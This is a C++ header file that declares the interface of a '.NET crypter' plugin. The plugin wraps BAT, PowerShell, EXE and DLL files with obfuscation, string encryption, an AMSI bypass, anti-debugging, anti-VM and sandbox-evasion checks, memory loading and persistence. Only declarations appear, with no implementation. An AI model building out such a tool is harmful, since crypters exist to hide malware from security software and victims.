#pragma once
#include <string>
#include <vector>

// Configuration structure for .NET crypting
struct DotNetCrypterConfig {
    int obfuscationLevel;
    bool addAntiDebug;
    bool addAMSI;
    bool addMemoryLoading;
    bool addStringEncryption;
    bool addPersistence;
    bool addAntiVM;
    bool addSandboxEvasion;
};

// .NET Crypter Plugin Interface
class DotNetCrypter {
private:
    DotNetCrypterConfig config;

    // Utility functions
    std::string generateRandomString(size_t length);
    std::string base64Encode(const std::string& input);
    std::string generateAntiDebugCode();
    std::string generateAMSIBypass();
    std::string generateAntiVMCode();
    std::string generateSandboxEvasion();

    // Menu handlers
    void handleCryptBAT();
    void handleCryptPS1();
    void handleCryptEXE();
    void handleCryptDLL();
    void handleAddAntiDebug();
    void handleAddAMSI();
    void handleAddMemoryLoading();
    void handleAddStringEncryption();
    void handleAddPersistence();
    void handleConfiguration();

public:
    DotNetCrypter();
    ~DotNetCrypter();

    // Plugin interface methods
    std::string getName() const;
    std::string getDescription() const;
    std::string getVersion() const;
    bool initialize();
    void execute();
    std::vector<std::string> getOptions() const;
    void setOption(const std::string& option, const std::string& value);

    // .NET Crypting Methods
    std::string cryptBATFile(const std::string& filePath);
    std::string cryptPS1File(const std::string& filePath);
    std::string cryptEXEFile(const std::string& filePath);
    std::string cryptDLLFile(const std::string& filePath);
    std::string addAntiDebugging(const std::string& code);
    std::string addAMSIBypass(const std::string& code);
    std::string addMemoryLoading(const std::string& code);
    std::string addStringEncryption(const std::string& code);
    std::string addPersistence(const std::string& code);
    std::string generateObfuscatedCode(const std::string& originalCode);

    // Configuration methods
    void setObfuscationLevel(int level);
    void setAddAntiDebug(bool add);
    void setAddAMSI(bool add);
    void setAddMemoryLoading(bool add);
    void setAddStringEncryption(bool add);
    void setAddPersistence(bool add);
    void setAddAntiVM(bool add);
    void setAddSandboxEvasion(bool add);

    // Menu interface
    void showMenu();
};
